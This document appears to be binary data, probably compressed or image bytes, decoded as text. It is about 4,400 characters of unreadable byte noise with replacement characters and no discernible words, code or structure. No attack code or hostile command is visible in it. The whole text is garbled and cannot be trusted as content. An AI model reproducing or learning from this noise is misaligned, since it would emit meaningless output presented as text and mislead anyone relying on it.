t�%���}�@M�	=zb�(�6l�P]W��Oҟo�I-�`�Õ��П���4/j�Q�fT��q����6��՜�l����E�D�K.D@*Ԝ�� �Y�����s�jA�G;�'����Ao���(@�QI:�6� e�� `���T�E����`|�T��wU@��6��`���#��?Z��2�`[���H��t8��Gsp��8�C���h��T���cs���v�~��x�&F�ql�	9t#���S]�~y��j�:�ю�GU>�&v�j��">�WqD���-#�9�e?��?M�a���c�o�gԯ֠�yymȾ �ȣ�Q��z�+�֬�N2%dQ�� ����=�
�%�b�(���k81����B=�17�c���%�E�sЏ�i�˧����=%���3^���m1)2��
E(3ߠ�pQ��`?�t�֘��9��irX�2G�5���m��dH	:('%O�5��5����x�n�x�\�Ii�L�M${b���H=�{
қ����֕�ͫ��a��o�q^O}�sp`�\z�^��Hn�a�$�_�o�s���应/�Ҥn���Uۓ]�VsD�'5$WA�i�Y\2`�&6#�.x5��i ��d%�����S-;�S�c���,#�Ҳ��TY � 4�W���@4X.LB���QH���p�N@�� �:N�^��fh��9�*�8<U-Iغ@5Vpv�:)v��~���f2GcF�{����AaP!��i��&i�WI��O9����7i��3K�`3b��@� R)4�H�ii)@4 b��v}�i)(�������CiE��#�)95��L1 �OAS,B3�=X��s)��F��?L�_��l�˹%��l$m�r��U"^NA$ԩ(�j�©ކ�U��\�et�#�j�9 �I� RT7sD�j2iƛ�HS��$�	U' T��y�͔|��-MX�vD���V�@�Rz����!����iCD� ��	�FHP	녬[m�Q��� ��ǎ���R�<@��,9%A��BJ��B�I���%0��dr:e��� �9��!� ��{t�YQ�"'#=v�F�Ъ�K3@s�֦e��3�QRy�#��*7) �T��~�W���,-�f)\،�Β�x��KU��6
�7�R�B1#�i�F�N_�928 ��SNk�i�o��Tf���[�'��Z*��a��F 4�O��Mfќ�,;��V����(��]@����R� ꡁ8�ǭTRN*U�jX&\��,�8 �<s[P�ݲ+��y�{n�\� d���*�p�u �Eg(�SZs���I	���<;`�:b��Ӗ]���\7r�����$-q
�!F@�Xt�[�"K�PIQ�U���V:�=Ѝ-!��a��;PH����*F�:��j6�-��$r?
��D�3#>�)O@_ʤ�-�#Y�I�$�NA��֧�H�ͪPI�8d�����iGb��'�g �m��hnZi8%w��GB)�p"7�ǜ,��^��������d�e��T1�R�M;�2���
��Ww��H券Y7=C��{SH� �"6� �)
���i�v�=��o,�����O9؊�w��k $��fc������Zu*�b�@�]�q�rj�	�f�A_N�yd-)�z���>�bH� �>�_3�������$����H��;�?h}�~���p�G@��>��'D:����I������x�;�a���gõA_��A�ǙBv�R>��gWW��Z�1�L��H�;�Z�!um�Yb ��{�z�,@�8O0�LOR:��T��4SL\C�(�s�G�U��bc,���R0G��3cn�KD�ZN6��uo�eʂ[��	[y���8��鐻�r�����Do=����I� ���M+�ƥ�nbB�_�����SIuo<��a ���Qy���s�pz})�6�X�LE;�s�� ��~ɮ�>�\	�:�:y������bT#��~�u�g��g#�s����H��"�,��/u�,���ԁ�,��G�>���9m�[��e�^�O���Fb8����z��1�� *���; *�rW�'�	��q*� ��H���~�N��J�cЏ�1�k��'$�w����^�k)�a� XGR{Ie�{�K��pq'`+b��`c �k9>�Ǩ>خt�yz��	˱�]:c�Z]��V���9)ݏF��i�2WGj�� �d,�6����,}��{VyV�hu�>�CU�/��hoQ����a�=���e��-�Oܹ���0o�x��6����N�mBw	n���W�]��+)#�GQ^�a+�p^0�Oq����-�]:I�ڌH%�o�`=k��[h@�����B�F*�&�Ȣ���4X�F���Fhr(�
��3@�����*x��ɢ��)y��SVʫ��ʛI ��$ҁF)�V`7��)qE�LQ�^��W��QL�@QNPM 4�f�њ )���S���<R%�$��-��C?-�GAI����6��g;Tt�^2E�@ d棺�X�U;�����6��Y��s}#�+K6�pB�Tt�f�e`]�68����Q�`��	���*vbI$Q�L���iXa>�ܟJ��m0�B�A&�H$�|Ò���X�e�Q�g�ڶ�� ��� �`)|�8 �2|��yP<�[%I��)+SI�M+8P )�C���
��G��5X3<�M2�8)O���]�VU(���� hV̧�~�9� �@Ri�\œr	i$������bXS��J\�|̜��a95^#���NI�K�C1��4�+��R��P�5bT�9�H	P\9C��'E��z�:�����Փ!8�]�m��*��ɩ�$c��H$*!�2Gz�8 �Gc�԰82) v�5 `W s�Up��:�>�֥�4�a�9(b@�ߍ]R���er=ˏ��Iz���p>Ɍ��=�=�9#x�ԝ�k(V0w
����0�py ��g]��5���,�mmʭ���Z�1%�� 	'�'�Gҳ��j-��s!v����2�b@�$�p6��j�!�r�9d'�wڡ�B��%qяT=?[�w��� "2@�T��>��6�ў03�t,������*�39$��5&6����8$��z5Z"CI�j3�@�݌�=�֓Y�#��rOp1�GЊ���N���g/��=��5��!�RB�`J�{�=ܞ�c��yer���Ǩ�LR��َN|�rO4)���d~���w��^�um�J�=����-M^��(V�`�	���r�k1Hl����#�`� T1E7꠱U��!��T���ȣ%a�$e����"���xm� ���RU�I4_��q��U�6���k='�'���������F��K���f^��N�}+[RZ�v����$b��#���9ɨ��n��\�R�ȝ�N�L�m
Ln#��6�#��)-@�;�1%� ��х(�KKv����)P��9"�m{�<��n��֪�+̒�4�#��3�aSO۴1�&Ԙls�?����Kn���i�pe`@=6l�b�Ti����ܧ�P:��Ӯ�8���G.�  �K�p�1B,3>Y=
���(@Y���h;��pR�ĩ	�K�)!����m>H�ݭ� C+y�}uƁ.�aɔ�r�	6����X�H�M�������ow)ɐv`�?*����b\��S�
@�$��R
 '=�GA�S�m���������Ow�GҤ�n�$�7�p��N�#�"�Lx�Ib��Sw2�B�}���g��5ླྀ�Sd���H�n�?\� �O��{I4�iD+�v(N0}����i���
�u'�
]@�wm%��#)�ԯsM6)%��i�E�U%�iP��BMk2ڛ'B��1�Gq�¹]
bn�.T#:��$��u������;q���𮘽)�3���2[;��~�xoQ��6�U�5�Zޚ��,��0
a���z�K�7!�	zh���w�N �"�"��d�PhITD�Ө"��3I�CL&�M�M��@¡�81�`��JZ�aIKE (f�C@Ɠ�))����@�iBn U�k������~��`ÃL4����� ��#��*�bu�+O�RݑPWe����A8䚫-�9X���Zp�+?�>��u:e��	˒R@ɫvr�HT�' ����Z� ��ބ��XT�QH)_�����	��JQT��l�ij)� �� ��1/aZ���b}��T�Q&\	䜅*��z�"��S�����JL��O�SK�pR�CZ#&؞l���02I@O֤�����2PH'��BH�sD�q����խ ��l����b�ZS�&*cM4Ù��ꦔSZ� ��"��
i�1������XT�Z� �J�U�$T���K�M�ַ8ERT�T�����P��}Ƥ2X�Q��^ȯp1�Zϋ�b�EY�� X�����,��%� �c�:չ�V��(� 0N�J��C� ]^����� \g���Dv-]��BT2@:�K�cia`��<3�c#F�I� \��O�W���iu�m�(�G�n��v��\+,��.A'�}j�
�����?��Fl`(���YRMk���� �?U5����j�~�� ��t��*��(,&Io���=����4��2w�Էj��� ���U��׿��GCT=B0��#�2f�)�i*G�}���?���gM� )� _��!�%x��Y2w�`:�5v��-m�#� m��oqPA�l~�#L��=�?����bE�@D��P`m��IzZܫV]�Gt�Q�	� ^/Q�� Ǽ?�ƑD�G��B��� �`��.�m��읱P'��n� �T�gߗ�Ť�$�T���db�>Y>ݍ6�!si#K!g9M��a�����)�?�{\�h�a�G�D.�F̎q���aF����8%ջ�m�*M�A�� ����  s�����#�B��z��d�lz}((^�oT�a��{c��X� ���������i�؈-��r��@?�z�d�,L�)��!�3��ib� ���.��X�h���=���ٖ�D�@$�?�h�/on�j$�L~�9+�EMw� zo��*n�� ���� ���i<5z�0�FL���	5߇{xŪ����۸?A^c���}� A�P��?l~��5��9�?(͙��!=׸>�Oi[R)@̨6ˏ��נ�� �����d��.?��_�*�LO�"���zҹ�k<�BdT�Ӎ2��њ% !�O4�@i��i���LҚJ`��